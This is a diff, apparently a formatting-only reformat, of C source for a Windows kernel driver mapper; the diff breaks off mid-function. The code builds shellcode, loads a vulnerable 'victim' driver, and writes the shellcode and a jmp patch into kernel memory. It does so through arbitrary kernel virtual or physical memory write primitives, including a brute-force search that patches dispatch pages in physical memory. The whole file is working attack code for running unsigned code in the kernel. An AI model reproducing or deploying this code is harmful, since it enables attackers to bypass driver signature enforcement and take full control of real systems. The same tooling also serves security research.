@@ -3,18 +3,15 @@
 #include "global.h"
 
 /*
-* KDUShowPayloadResult
-*
-* Purpose:
-*
-* Query and display shellcode result.
-*
-*/
-VOID KDUShowPayloadResult(
-    _In_ PKDU_CONTEXT Context,
-    _In_ HANDLE SectionHandle
-)
-{
+ * KDUShowPayloadResult
+ *
+ * Purpose:
+ *
+ * Query and display shellcode result.
+ *
+ */
+VOID KDUShowPayloadResult(_In_ PKDU_CONTEXT Context,
+                          _In_ HANDLE SectionHandle) {
     NTSTATUS ntStatus;
     ULONG payloadSize = 0;
     SIZE_T viewSize;
@@ -33,66 +30,54 @@ VOID KDUShowPayloadResult(
     ScSizeOf(Context->ShellVersion, &payloadSize);
     viewSize = ALIGN_UP_BY(payloadSize, PAGE_SIZE);
 
-    ntStatus = NtMapViewOfSection(SectionHandle,
-        NtCurrentProcess(),
-        &pvPayloadHead.Ref,
-        0,
-        PAGE_SIZE,
-        NULL,
-        &viewSize,
-        ViewUnmap,
-        0,
-        PAGE_READONLY);
+    ntStatus = NtMapViewOfSection(SectionHandle, NtCurrentProcess(),
+                                  &pvPayloadHead.Ref, 0, PAGE_SIZE, NULL,
+                                  &viewSize, ViewUnmap, 0, PAGE_READONLY);
 
     if (NT_SUCCESS(ntStatus) && pvPayloadHead.Ref) {
-
         switch (Context->ShellVersion) {
+            case KDU_SHELLCODE_V2:
 
-        case KDU_SHELLCODE_V2:
+                supPrintfEvent(
+                    kduEventInformation,
+                    "[~] Shellcode result, system worker: 0x%p\r\n",
+                    (PVOID)pvPayloadHead.Version.v1->IoStatus.Information);
 
-            supPrintfEvent(kduEventInformation,
-                "[~] Shellcode result, system worker: 0x%p\r\n",
-                (PVOID)pvPayloadHead.Version.v1->IoStatus.Information);
+                break;
 
-            break;
+            case KDU_SHELLCODE_V3:
+            case KDU_SHELLCODE_V1:
+            default:
 
-        case KDU_SHELLCODE_V3:
-        case KDU_SHELLCODE_V1:
-        default:
+                supPrintfEvent(kduEventInformation,
+                               "[~] Shellcode result: NTSTATUS (0x%lX)\r\n",
+                               pvPayloadHead.Version.v1->IoStatus.Status);
 
-            supPrintfEvent(kduEventInformation,
-                "[~] Shellcode result: NTSTATUS (0x%lX)\r\n", pvPayloadHead.Version.v1->IoStatus.Status);
-
-            break;
+                break;
         }
 
         NtUnmapViewOfSection(NtCurrentProcess(), pvPayloadHead.Ref);
-    }
-    else {
-
+    } else {
         supPrintfEvent(kduEventError,
-            "[!] Cannot map shellcode section, NTSTATUS (%lX)\r\n", ntStatus);
-
+                       "[!] Cannot map shellcode section, NTSTATUS (%lX)\r\n",
+                       ntStatus);
     }
 }
 
 /*
-* KDUStorePayloadInSection
-*
-* Purpose:
-*
-* Load input file as image, resolve import and store result in shared section.
-*
-*/
-BOOL KDUStorePayloadInSection(
-    _In_ PKDU_CONTEXT Context,
-    _Out_ PHANDLE SectionHandle,
-    _Out_ PSIZE_T ViewSize,
-    _In_ PVOID ImageBase,
-    _In_ ULONG_PTR KernelImage,
-    _In_ ULONG_PTR KernelBase
-)
-{
+ * KDUStorePayloadInSection
+ *
+ * Purpose:
+ *
+ * Load input file as image, resolve import and store result in shared section.
+ *
+ */
+BOOL KDUStorePayloadInSection(_In_ PKDU_CONTEXT Context,
+                              _Out_ PHANDLE SectionHandle,
+                              _Out_ PSIZE_T ViewSize,
+                              _In_ PVOID ImageBase,
+                              _In_ ULONG_PTR KernelImage,
+                              _In_ ULONG_PTR KernelBase) {
     BOOL bSuccess = FALSE;
     NTSTATUS ntStatus = STATUS_UNSUCCESSFUL;
     HANDLE sectionHandle = NULL;
@@ -123,20 +108,19 @@ BOOL KDUStorePayloadInSection(
     *ViewSize = 0;
 
     do {
-
         SIZE_T cbPayloadHead;
 
         switch (Context->ShellVersion) {
-        case KDU_SHELLCODE_V3:
-            cbPayloadHead = sizeof(PAYLOAD_HEADER_V3);
-            break;
-        case KDU_SHELLCODE_V2:
-            cbPayloadHead = sizeof(PAYLOAD_HEADER_V2);
-            break;
-        case KDU_SHELLCODE_V1:
-        default:
-            cbPayloadHead = sizeof(PAYLOAD_HEADER_V1);
-            break;
+            case KDU_SHELLCODE_V3:
+                cbPayloadHead = sizeof(PAYLOAD_HEADER_V3);
+                break;
+            case KDU_SHELLCODE_V2:
+                cbPayloadHead = sizeof(PAYLOAD_HEADER_V2);
+                break;
+            case KDU_SHELLCODE_V1:
+            default:
+                cbPayloadHead = sizeof(PAYLOAD_HEADER_V1);
+                break;
         }
 
         //
@@ -144,9 +128,8 @@ BOOL KDUStorePayloadInSection(
         //
         pvPayloadHead.Ref = supHeapAlloc(cbPayloadHead);
         if (pvPayloadHead.Ref == NULL) {
-
             supPrintfEvent(kduEventError,
-                "[!] Error, payload header not allocated\r\n");
+                           "[!] Error, payload header not allocated\r\n");
 
             break;
         }
@@ -156,7 +139,8 @@ BOOL KDUStorePayloadInSection(
         //
         ntStatus = supCreateSystemAdminAccessSD(&sectionSD, &defaultAcl);
         if (!NT_SUCCESS(ntStatus)) {
-            supShowHardError("[!] Error, shared section SD not allocated", ntStatus);
+            supShowHardError("[!] Error, shared section SD not allocated",
+                             ntStatus);
             break;
         }
 
@@ -164,7 +148,8 @@ BOOL KDUStorePayloadInSection(
         // Create UUID.
         //
         if (RPC_S_OK != UuidCreate(&secUuid)) {
-            supShowWin32Error("[!] Cannot allocate shared section UUID", GetLastError());
+            supShowWin32Error("[!] Cannot allocate shared section UUID",
+                              GetLastError());
             break;
         }
 
@@ -182,11 +167,9 @@ BOOL KDUStorePayloadInSection(
             printf_s("[+] Resolving kernel import for input driver\r\n");
             supResolveKernelImport((ULONG_PTR)dataPtr, KernelImage, KernelBase);
 
-        }
-        else {
-
+        } else {
             supPrintfEvent(kduEventError,
-                "[!] Could not allocate memory for image\r\n");
+                           "[!] Could not allocate memory for image\r\n");
 
             break;
         }
@@ -196,19 +179,16 @@ BOOL KDUStorePayloadInSection(
         //
         RtlSecureZeroMemory(szName, sizeof(szName));
         StringCchPrintf(szName, RTL_NUMBER_OF(szName),
-            L"\\BaseNamedObjects\\{%08X-%04X-%04X-%02X%02X-%02X%02X%02X%02X%02X%02X}",
-            secUuid.Data1, secUuid.Data2, secUuid.Data3,
-            secUuid.Data4[0],
-            secUuid.Data4[1],
-            secUuid.Data4[2],
-            secUuid.Data4[3],
-            secUuid.Data4[4],
-            secUuid.Data4[5],
-            secUuid.Data4[6],
-            secUuid.Data4[7]);
+                        L"\\BaseNamedObjects\\{%08X-%04X-%04X-%02X%02X-%02X%"
+                        L"02X%02X%02X%02X%02X}",
+                        secUuid.Data1, secUuid.Data2, secUuid.Data3,
+                        secUuid.Data4[0], secUuid.Data4[1], secUuid.Data4[2],
+                        secUuid.Data4[3], secUuid.Data4[4], secUuid.Data4[5],
+                        secUuid.Data4[6], secUuid.Data4[7]);
 
         RtlInitUnicodeString(&uStr, szName);
-        InitializeObjectAttributes(&objAttr, &uStr, OBJ_CASE_INSENSITIVE, NULL, sectionSD);
+        InitializeObjectAttributes(&objAttr, &uStr, OBJ_CASE_INSENSITIVE, NULL,
+                                   sectionSD);
 
         LARGE_INTEGER liSectionSize;
         SIZE_T viewSize = ALIGN_UP_BY(isz + cbPayloadHead, PAGE_SIZE);
@@ -216,53 +196,39 @@ BOOL KDUStorePayloadInSection(
         liSectionSize.QuadPart = viewSize;
         *ViewSize = viewSize;
 
-        ntStatus = NtCreateSection(&sectionHandle,
-            SECTION_ALL_ACCESS,
-            &objAttr,
-            &liSectionSize,
-            PAGE_READWRITE,
-            SEC_COMMIT,
-            NULL);
+        ntStatus =
+            NtCreateSection(&sectionHandle, SECTION_ALL_ACCESS, &objAttr,
+                            &liSectionSize, PAGE_READWRITE, SEC_COMMIT, NULL);
 
         if (!NT_SUCCESS(ntStatus)) {
-            supShowHardError("[!] Error, cannot create shared section", ntStatus);
+            supShowHardError("[!] Error, cannot create shared section",
+                             ntStatus);
             break;
         }
 
-        ntStatus = NtMapViewOfSection(sectionHandle,
-            NtCurrentProcess(),
-            &pvSharedSection,
-            0,
-            PAGE_SIZE,
-            NULL,
-            &viewSize,
-            ViewUnmap,
-            MEM_TOP_DOWN,
-            PAGE_READWRITE);
+        ntStatus = NtMapViewOfSection(
+            sectionHandle, NtCurrentProcess(), &pvSharedSection, 0, PAGE_SIZE,
+            NULL, &viewSize, ViewUnmap, MEM_TOP_DOWN, PAGE_READWRITE);
 
         if (NT_SUCCESS(ntStatus)) {
-
             printf_s("[+] Resolving payload import\r\n");
 
-            if (ScResolveImportForPayload(
-                Context->ShellVersion,
-                pvPayloadHead.Ref,
-                KernelImage,
-                KernelBase))
-            {
+            if (ScResolveImportForPayload(Context->ShellVersion,
+                                          pvPayloadHead.Ref, KernelImage,
+                                          KernelBase)) {
                 EncodeBuffer(dataPtr, isz, Context->EncryptKey);
 
                 switch (Context->ShellVersion) {
-                case KDU_SHELLCODE_V3:
-                    pvPayloadHead.Version.v3->ImageSize = isz;
-                    break;
-                case KDU_SHELLCODE_V2:
-                    pvPayloadHead.Version.v2->ImageSize = isz;
-                    break;
-                case KDU_SHELLCODE_V1:
-                default:
-                    pvPayloadHead.Version.v1->ImageSize = isz;
-                    break;
+                    case KDU_SHELLCODE_V3:
+                        pvPayloadHead.Version.v3->ImageSize = isz;
+                        break;
+                    case KDU_SHELLCODE_V2:
+                        pvPayloadHead.Version.v2->ImageSize = isz;
+                        break;
+                    case KDU_SHELLCODE_V1:
+                    default:
+                        pvPayloadHead.Version.v1->ImageSize = isz;
+                        break;
                 }
 
                 //
@@ -271,29 +237,29 @@ BOOL KDUStorePayloadInSection(
                 pvPayloadHead.Version.v1->IoStatus.Status = STATUS_UNSUCCESSFUL;
 
                 if (!ScStoreVersionSpecificData(Context, pvPayloadHead.Ref)) {
-
                     supPrintfEvent(kduEventError,
-                        "[!] Error, cannot store additional data for shellcode\r\n");
+                                   "[!] Error, cannot store additional data "
+                                   "for shellcode\r\n");
 
                     break;
                 }
 
-                RtlCopyMemory(pvSharedSection, pvPayloadHead.Ref, cbPayloadHead);
-                RtlCopyMemory(RtlOffsetToPointer(pvSharedSection, cbPayloadHead), dataPtr, isz);
+                RtlCopyMemory(pvSharedSection, pvPayloadHead.Ref,
+                              cbPayloadHead);
+                RtlCopyMemory(
+                    RtlOffsetToPointer(pvSharedSection, cbPayloadHead), dataPtr,
+                    isz);
 
                 NtUnmapViewOfSection(NtCurrentProcess(), pvSharedSection);
                 *SectionHandle = sectionHandle;
                 bSuccess = TRUE;
-            }
-            else {
-
-                supPrintfEvent(kduEventError,
+            } else {
+                supPrintfEvent(
+                    kduEventError,
                     "[!] Error, resolving additional import failed\r\n");
-
             }
 
-        }
-        else {
+        } else {
             supShowHardError("[!] Error, shared section not mapped", ntStatus);
         }
 
@@ -301,16 +267,20 @@ BOOL KDUStorePayloadInSection(
 
     SetLastError(RtlNtStatusToDosError(ntStatus));
 
-    if (dataPtr) supHeapFree(dataPtr);
-    if (sectionSD) supHeapFree(sectionSD);
-    if (pvPayloadHead.Ref) supHeapFree(pvPayloadHead.Ref);
-    if (defaultAcl) supHeapFree(defaultAcl);
+    if (dataPtr)
+        supHeapFree(dataPtr);
+    if (sectionSD)
+        supHeapFree(sectionSD);
+    if (pvPayloadHead.Ref)
+        supHeapFree(pvPayloadHead.Ref);
+    if (defaultAcl)
+        supHeapFree(defaultAcl);
 
     if (bSuccess == FALSE) {
-
-        if (pvSharedSection) NtUnmapViewOfSection(NtCurrentProcess(), pvSharedSection);
-        if (sectionHandle) NtClose(sectionHandle);
-
+        if (pvSharedSection)
+            NtUnmapViewOfSection(NtCurrentProcess(), pvSharedSection);
+        if (sectionHandle)
+            NtClose(sectionHandle);
     }
 
     FUNCTION_LEAVE_MSG(__FUNCTION__);
@@ -319,18 +289,16 @@ BOOL KDUStorePayloadInSection(
 }
 
 /*
-* KDUSetupShellCode
-*
-* Purpose:
-*
-* Construct shellcode data, init code.
-*
-*/
-PVOID KDUSetupShellCode(
-    _In_ PKDU_CONTEXT Context,
-    _In_ PVOID ImageBase,
-    _Out_ PHANDLE SectionHandle)
-{
+ * KDUSetupShellCode
+ *
+ * Purpose:
+ *
+ * Construct shellcode data, init code.
+ *
+ */
+PVOID KDUSetupShellCode(_In_ PKDU_CONTEXT Context,
+                        _In_ PVOID ImageBase,
+                        _Out_ PHANDLE SectionHandle) {
     NTSTATUS ntStatus;
     ULONG procSize = 0;
     SIZE_T viewSize = 0;
@@ -348,12 +316,10 @@ PVOID KDUSetupShellCode(
     *SectionHandle = NULL;
 
     do {
-
         KernelBase = Context->NtOsBase;
         if (KernelBase == 0) {
-
             supPrintfEvent(kduEventError,
-                "[!] Cannot query ntoskrnl loaded base, abort\r\n");
+                           "[!] Cannot query ntoskrnl loaded base, abort\r\n");
 
             break;
         }
@@ -380,16 +346,10 @@ PVOID KDUSetupShellCode(
         //
         // Prepare and store payload for later shellcode use.
         //
-        if (!KDUStorePayloadInSection(Context,
-            &sectionHandle,
-            &viewSize,
-            ImageBase,
-            KernelImage,
-            KernelBase))
-        {
-
+        if (!KDUStorePayloadInSection(Context, &sectionHandle, &viewSize,
+                                      ImageBase, KernelImage, KernelBase)) {
             supPrintfEvent(kduEventError,
-                "[!] Error while mapping payload, abort\r\n");
+                           "[!] Error while mapping payload, abort\r\n");
 
             break;
         }
@@ -399,20 +359,16 @@ PVOID KDUSetupShellCode(
         //
         // Allocate shellcode.
         //
-        pvShellCode = ScAllocate(Context->ShellVersion,
-            sectionHandle,
-            viewSize,
-            KernelImage,
-            KernelBase,
-            Context->MemoryTag,
-            &procSize);
+        pvShellCode =
+            ScAllocate(Context->ShellVersion, sectionHandle, viewSize,
+                       KernelImage, KernelBase, Context->MemoryTag, &procSize);
 
         if (pvShellCode == NULL)
             break;
 
         if (procSize == 0) {
-
-            supPrintfEvent(kduEventError,
+            supPrintfEvent(
+                kduEventError,
                 "[!] Unexpected shellcode procedure size, abort\r\n");
 
             ScFree(pvShellCode, ScSizeOf(Context->ShellVersion, NULL));
@@ -430,17 +386,15 @@ PVOID KDUSetupShellCode(
 }
 
 /*
-* KDUPagePatchCallback
-*
-* Purpose:
-*
-* Patch dispatch pages in physical memory.
-*
-*/
-BOOL WINAPI KDUPagePatchCallback(
-    _In_ ULONG_PTR Address,
-    _In_ PVOID UserContext)
-{
+ * KDUPagePatchCallback
+ *
+ * Purpose:
+ *
+ * Patch dispatch pages in physical memory.
+ *
+ */
+BOOL WINAPI KDUPagePatchCallback(_In_ ULONG_PTR Address,
+                                 _In_ PVOID UserContext) {
     BOOL bIoResult;
     PKDU_PHYSMEM_ENUM_PARAMS Params = (PKDU_PHYSMEM_ENUM_PARAMS)UserContext;
 
@@ -456,71 +410,62 @@ BOOL WINAPI KDUPagePatchCallback(
     BYTE buffer[PAGE_SIZE];
     RtlSecureZeroMemory(&buffer, sizeof(buffer));
 
-    if (ReadPhysicalMemory(Params->DeviceHandle,
-        Address,
-        &buffer,
-        PAGE_SIZE))
-    {
-        if (signatureSize == RtlCompareMemory(dispatchSignature,
-            RtlOffsetToPointer(buffer, dispatchPageOffset),
-            signatureSize))
-        {
-            printf_s("\t-> Found page with code at address 0x%llX\r\n", Address);
+    if (ReadPhysicalMemory(Params->DeviceHandle, Address, &buffer, PAGE_SIZE)) {
+        if (signatureSize ==
+            RtlCompareMemory(dispatchSignature,
+                             RtlOffsetToPointer(buffer, dispatchPageOffset),
+                             signatureSize)) {
+            printf_s("\t-> Found page with code at address 0x%llX\r\n",
+                     Address);
             Params->ccPagesFound += 1;
 
-            if ((SIZE_T)dispatchPageOffset + (SIZE_T)Params->cbPayload > PAGE_SIZE) {
-
-                unsigned char jmpcode[] = { 0xe9, 0x0, 0x0, 0x0, 0x0 };
+            if ((SIZE_T)dispatchPageOffset + (SIZE_T)Params->cbPayload >
+                PAGE_SIZE) {
+                unsigned char jmpcode[] = {0xe9, 0x0, 0x0, 0x0, 0x0};
 
                 *(PULONG)&jmpcode[1] = Params->JmpAddress;
 
                 printf_s("\t--> Setting jump[%lX][%lX] at address 0x%llX\r\n",
-                    jmpcode[0],
-                    *(PULONG)&jmpcode[1],
-                    Address + dispatchPageOffset);
+                         jmpcode[0], *(PULONG)&jmpcode[1],
+                         Address + dispatchPageOffset);
 
                 targetAddress = Address + dispatchPageOffset;
 
-                bIoResult = WritePhysicalMemory(Params->DeviceHandle,
-                    targetAddress,
-                    jmpcode,
-                    sizeof(jmpcode));
+                bIoResult =
+                    WritePhysicalMemory(Params->DeviceHandle, targetAddress,
+                                        jmpcode, sizeof(jmpcode));
 
                 if (bIoResult) {
-
-                    printf_s("\t--> Memory has been modified at address 0x%llX\r\n", Address + dispatchPageOffset);
-                    printf_s("\t--> Overwriting page at address 0x%llX\r\n", Address);
+                    printf_s(
+                        "\t--> Memory has been modified at address 0x%llX\r\n",
+                        Address + dispatchPageOffset);
+                    printf_s("\t--> Overwriting page at address 0x%llX\r\n",
+                             Address);
 
                     targetAddress = Address;
 
-                    bIoResult = WritePhysicalMemory(Params->DeviceHandle,
-                        targetAddress,
-                        Params->pvPayload,
+                    bIoResult = WritePhysicalMemory(
+                        Params->DeviceHandle, targetAddress, Params->pvPayload,
                         Params->cbPayload);
-
                 }
 
-            }
-            else {
-
+            } else {
                 targetAddress = Address + dispatchPageOffset;
 
-                bIoResult = WritePhysicalMemory(Params->DeviceHandle,
-                    targetAddress,
-                    Params->pvPayload,
-                    Params->cbPayload);
-
+                bIoResult =
+                    WritePhysicalMemory(Params->DeviceHandle, targetAddress,
+                                        Params->pvPayload, Params->cbPayload);
             }
 
             if (bIoResult) {
                 Params->ccPagesModified += 1;
-                printf_s("\t--> Memory has been modified at address 0x%llX\r\n", targetAddress);
-            }
-            else {
+                printf_s("\t--> Memory has been modified at address 0x%llX\r\n",
+                         targetAddress);
+            } else {
                 supPrintfEvent(kduEventError,
-                    "Could not modify memory at address 0x%llX\r\n", targetAddress);
+                               "Could not modify memory at address 0x%llX\r\n",
+                               targetAddress);
             }
-
         }
     }
 
@@ -528,21 +473,18 @@ BOOL WINAPI KDUPagePatchCallback(
 }
 
 /*
-* KDUDriverMapInit
-*
-* Purpose:
-*
-* Allocate shellcode structure and create sync event.
-*
-*/
-BOOL KDUDriverMapInit(
-    _In_ PKDU_CONTEXT Context,
-    _In_ PVOID ImageBase,
-    _Out_ PVOID* ShellCode,
-    _Out_ PHANDLE SectionHandle,
-    _Out_ PHANDLE SyncEventHandle
-)
-{
+ * KDUDriverMapInit
+ *
+ * Purpose:
+ *
+ * Allocate shellcode structure and create sync event.
+ *
+ */
+BOOL KDUDriverMapInit(_In_ PKDU_CONTEXT Context,
+                      _In_ PVOID ImageBase,
+                      _Out_ PVOID* ShellCode,
+                      _Out_ PHANDLE SectionHandle,
+                      _Out_ PHANDLE SyncEventHandle) {
     PVOID pvShellCode;
     HANDLE sectionHandle = NULL, readyEventHandle;
 
@@ -552,18 +494,16 @@ BOOL KDUDriverMapInit(
 
     pvShellCode = KDUSetupShellCode(Context, ImageBase, &sectionHandle);
     if (pvShellCode == NULL) {
-
         supPrintfEvent(kduEventError,
-            "[!] Error while building shellcode, abort\r\n");
+                       "[!] Error while building shellcode, abort\r\n");
 
         return FALSE;
     }
 
     readyEventHandle = ScCreateReadyEvent(Context->ShellVersion, pvShellCode);
     if (readyEventHandle == NULL) {
-
         supPrintfEvent(kduEventError,
-            "[!] Error building the ready event handle, abort\r\n");
+                       "[!] Error building the ready event handle, abort\r\n");
 
         ScFree(pvShellCode, ScSizeOf(Context->ShellVersion, NULL));
 
@@ -578,23 +518,21 @@ BOOL KDUDriverMapInit(
 }
 
 /*
-* KDUpMapDriverPhysicalTranslate
-*
-* Purpose:
-*
-* Process shellcode write through physical memory address translation.
-*
-*/
-BOOL KDUpMapDriverPhysicalTranslate(
-    _In_ PKDU_CONTEXT Context,
-    _In_ PVOID ScBuffer,
-    _In_ ULONG ScSize,
-    _In_ HANDLE ScSectionHandle,
-    _In_ HANDLE ReadyEventHandle,
-    _In_ PVICTIM_IMAGE_INFORMATION VictimImageInformation,
-    _In_ ULONG_PTR TargetAddress
-)
-{
+ * KDUpMapDriverPhysicalTranslate
+ *
+ * Purpose:
+ *
+ * Process shellcode write through physical memory address translation.
+ *
+ */
+BOOL KDUpMapDriverPhysicalTranslate(_In_ PKDU_CONTEXT Context,
+                                    _In_ PVOID ScBuffer,
+                                    _In_ ULONG ScSize,
+                                    _In_ HANDLE ScSectionHandle,
+                                    _In_ HANDLE ReadyEventHandle,
+                                    _In_ PVICTIM_IMAGE_INFORMATION
+                                        VictimImageInformation,
+                                    _In_ ULONG_PTR TargetAddress) {
     BOOL bSuccess = FALSE;
     HANDLE deviceHandle = Context->DeviceHandle;
     HANDLE victimDeviceHandle = NULL;
@@ -607,46 +545,41 @@ BOOL KDUpMapDriverPhysicalTranslate(
     provWriteKernelVM WriteKernelVM = prov->Callbacks.WriteKernelVM;
 
     do {
-
         if ((SIZE_T)dispatchPageOffset + (SIZE_T)ScSize > PAGE_SIZE) {
-
             memPage = (TargetAddress & 0xfffffffffffff000ull);
-            printf_s("[~] Shellcode overlaps page boundary, switching target memory address to 0x%llX\r\n", memPage);
+            printf_s(
+                "[~] Shellcode overlaps page boundary, switching target memory "
+                "address to 0x%llX\r\n",
+                memPage);
 
-            unsigned char jmpcode[] = { 0xe9, 0x0, 0x0, 0x0, 0x0 };
+            unsigned char jmpcode[] = {0xe9, 0x0, 0x0, 0x0, 0x0};
 
             *(PULONG)&jmpcode[1] = VictimImageInformation->JumpValue;
 
             printf_s("\t>> Setting jump[%lX][%lX] at address 0x%llX\r\n",
-                jmpcode[0],
-                *(PULONG)&jmpcode[1],
-                TargetAddress);
+                     jmpcode[0], *(PULONG)&jmpcode[1], TargetAddress);
 
-            if (!WriteKernelVM(deviceHandle, TargetAddress, &jmpcode, sizeof(jmpcode))) {
-
+            if (!WriteKernelVM(deviceHandle, TargetAddress, &jmpcode,
+                               sizeof(jmpcode))) {
                 supPrintfEvent(kduEventError,
-                    "[!] Error writting kernel memory, abort\r\n");
+                               "[!] Error writting kernel memory, abort\r\n");
 
                 break;
 
-            }
-            else {
-
+            } else {
                 targetAddress = TargetAddress - dispatchPageOffset;
-
             }
-
         }
 
         //
         // Write shellcode to kernel.
         //
-        printf_s("[+] Writing shellcode at 0x%llX address with size 0x%lX\r\n", targetAddress, ScSize);
+        printf_s("[+] Writing shellcode at 0x%llX address with size 0x%lX\r\n",
+                 targetAddress, ScSize);
 
         if (!WriteKernelVM(deviceHandle, targetAddress, ScBuffer, ScSize)) {
-
             supPrintfEvent(kduEventError,
-                "[!] Error writting kernel memory, abort\r\n");
+                           "[!] Error writting kernel memory, abort\r\n");
             break;
         }
 
@@ -660,13 +593,11 @@ BOOL KDUpMapDriverPhysicalTranslate(
         // Wait for the shellcode to trigger the event
         //
         if (WaitForSingleObject(ReadyEventHandle, 2000) != WAIT_OBJECT_0) {
-
             supPrintfEvent(kduEventError,
-                "[!] Shellcode did not trigger the event within two seconds.\r\n");
+                           "[!] Shellcode did not trigger the event within two "
+                           "seconds.\r\n");
 
-        }
-        else
-        {
+        } else {
             KDUShowPayloadResult(Context, ScSectionHandle);
             bSuccess = TRUE;
         }
@@ -685,22 +616,19 @@ BOOL KDUpMapDriverPhysicalTranslate(
 }
 
 /*
-* KDUpMapDriverPhysicalBruteForce
-*
-* Purpose:
-*
-* Process shellcode write through physical memory bruteforce.
-*
-*/
-BOOL KDUpMapDriverPhysicalBruteForce(
-    _In_ PKDU_CONTEXT Context,
-    _In_ PVOID ScBuffer,
-    _In_ ULONG ScSize,
-    _In_ HANDLE ScSectionHandle,
-    _In_ HANDLE ReadyEventHandle,
-    _In_ PKDU_PHYSMEM_ENUM_PARAMS EnumParams
-)
-{
+ * KDUpMapDriverPhysicalBruteForce
+ *
+ * Purpose:
+ *
+ * Process shellcode write through physical memory bruteforce.
+ *
+ */
+BOOL KDUpMapDriverPhysicalBruteForce(_In_ PKDU_CONTEXT Context,
+                                     _In_ PVOID ScBuffer,
+                                     _In_ ULONG ScSize,
+                                     _In_ HANDLE ScSectionHandle,
+                                     _In_ HANDLE ReadyEventHandle,
+                                     _In_ PKDU_PHYSMEM_ENUM_PARAMS EnumParams) {
     BOOL bSuccess = FALSE;
     KDU_VICTIM_PROVIDER* victimProv = Context->Victim;
     HANDLE victimDeviceHandle = NULL;
@@ -711,14 +639,14 @@ BOOL KDUpMapDriverPhysicalBruteForce(
     EnumParams->pvPayload = ScBuffer;
     EnumParams->cbPayload = ScSize;
 
-    supPrintfEvent(kduEventInformation,
-        "[+] Looking for %ws driver dispatch memory pages, please wait\r\n", victimProv->Name);
+    supPrintfEvent(
+        kduEventInformation,
+        "[+] Looking for %ws driver dispatch memory pages, please wait\r\n",
+        victimProv->Name);
 
     if (supEnumeratePhysicalMemory(KDUPagePatchCallback, EnumParams)) {
-
         printf_s("[+] Number of pages found: %llu, modified: %llu\r\n",
-            EnumParams->ccPagesFound,
-            EnumParams->ccPagesModified);
+                 EnumParams->ccPagesFound, EnumParams->ccPagesModified);
 
         //
         // Execute shellcode.
@@ -730,22 +658,18 @@ BOOL KDUpMapDriverPhysicalBruteForce(
         // Wait for the shellcode to trigger the event
         //
         if (WaitForSingleObject(ReadyEventHandle, 2000) != WAIT_OBJECT_0) {
-
             supPrintfEvent(kduEventError,
-                "[!] Shellcode did not trigger the event within two seconds.\r\n");
+                           "[!] Shellcode did not trigger the event within two "
+                           "seconds.\r\n");
 
-        }
-        else
-        {
+        } else {
             KDUShowPayloadResult(Context, ScSectionHandle);
             bSuccess = TRUE;
         }
 
-    }
-    else {
+    } else {
         supPrintfEvent(kduEventError,
-            "[!] Failed to enumerate physical memory.\r\n");
-
+                       "[!] Failed to enumerate physical memory.\r\n");
     }
 
     //
@@ -760,22 +684,19 @@ BOOL KDUpMapDriverPhysicalBruteForce(
 }
 
 /*
-* KDUpMapDriverDirectVM
-*
-* Purpose:
-*
-* Process shellcode write through direct virtual memory write primitive.
-*
-*/
-BOOL KDUpMapDriverDirectVM(
-    _In_ PKDU_CONTEXT Context,
-    _In_ PVOID ScBuffer,
-    _In_ ULONG ScSize,
-    _In_ HANDLE ScSectionHandle,
-    _In_ HANDLE ReadyEventHandle,
-    _In_ ULONG_PTR TargetAddress
-)
-{
+ * KDUpMapDriverDirectVM
+ *
+ * Purpose:
+ *
+ * Process shellcode write through direct virtual memory write primitive.
+ *
+ */
+BOOL KDUpMapDriverDirectVM(_In_ PKDU_CONTEXT Context,
+                           _In_ PVOID ScBuffer,
+                           _In_ ULONG ScSize,
+                           _In_ HANDLE ScSectionHandle,
+                           _In_ HANDLE ReadyEventHandle,
+                           _In_ ULONG_PTR TargetAddress) {
     BOOL bSuccess = FALSE;
     KDU_PROVIDER* prov = Context->Provider;
     KDU_VICTIM_PROVIDER* victimProv = Context->Victim;
@@ -784,18 +705,13 @@ BOOL KDUpMapDriverDirectVM(
     //
     // Write shellcode to driver.
     //
-    if (!prov->Callbacks.WriteKernelVM(Context->DeviceHandle,
-        TargetAddress,
-        ScBuffer,
-        ScSize))
-    {
-
-        supPrintfEvent(kduEventError,
+    if (!prov->Callbacks.WriteKernelVM(Context->DeviceHandle, TargetAddress,
+                                       ScBuffer, ScSize)) {
+        supPrintfEvent(
+            kduEventError,
             "[!] Error writing shellcode to the target driver, abort\r\n");
 
-    }
-    else {
-
+    } else {
         printf_s("[+] Driver handler code modified\r\n");
 
         //
@@ -808,13 +724,11 @@ BOOL KDUpMapDriverDirectVM(
         // Wait for the shellcode to trigger the event
         //
         if (WaitForSingleObject(ReadyEventHandle, 2000) != WAIT_OBJECT_0) {
-
             supPrintfEvent(kduEventError,
-                "[!] Shellcode did not trigger the event within two seconds.\r\n");
+                           "[!] Shellcode did not trigger the event within two "
+                           "seconds.\r\n");
 
-        }
-        else
-        {
+        } else {
             KDUShowPayloadResult(Context, ScSectionHandle);
             bSuccess = TRUE;
         }
@@ -832,17 +746,14 @@ BOOL KDUpMapDriverDirectVM(
 }
 
 /*
-* KDUMapDriver
-*
-* Purpose:
-*
-* Run mapper.
-*
-*/
-BOOL KDUMapDriver(
-    _In_ PKDU_CONTEXT Context,
-    _In_ PVOID ImageBase)
-{
+ * KDUMapDriver
+ *
+ * Purpose:
+ *
+ * Run mapper.
+ *
+ */
+BOOL KDUMapDriver(_In_ PKDU_CONTEXT Context, _In_ PVOID ImageBase) {
     BOOL bSuccess = FALSE;
     ULONG_PTR targetAddress = 0;
     PVOID pvShellCode = NULL;
@@ -861,21 +772,15 @@ BOOL KDUMapDriver(
     victimProv = Context->Victim;
 
     do {
-
         viLoadParams.Provider = victimProv;
 
         //
         // Load victim driver.
         //
-        if (VpCreate(victimProv,
-            Context->ModuleBase,
-            NULL,
-            VpLoadDriverCallback,
-            &viLoadParams))
-        {
+        if (VpCreate(victimProv, Context->ModuleBase, NULL,
+                     VpLoadDriverCallback, &viLoadParams)) {
             printf_s("[+] Successfully loaded victim driver\r\n");
-        }
-        else {
+        } else {
             supShowWin32Error("[!] Cannot load victim target", GetLastError());
             break;
         }
@@ -887,37 +792,27 @@ BOOL KDUMapDriver(
 
         printf_s("[+] Query victim image information\r\n");
 
-        if (VpQueryInformation(
-            Context->Victim,
-            VictimImageInformation,
-            &vi,
-            sizeof(vi)))
-        {
+        if (VpQueryInformation(Context->Victim, VictimImageInformation, &vi,
+                               sizeof(vi))) {
             dispatchOffset = vi.DispatchOffset;
 
             RtlSecureZeroMemory(&vdi, sizeof(vdi));
 
             printf_s("[+] Query victim loaded driver layout\r\n");
 
-            if (VpQueryInformation(
-                Context->Victim,
-                VictimDriverInformation,
-                &vdi,
-                sizeof(vdi)))
-            {
-
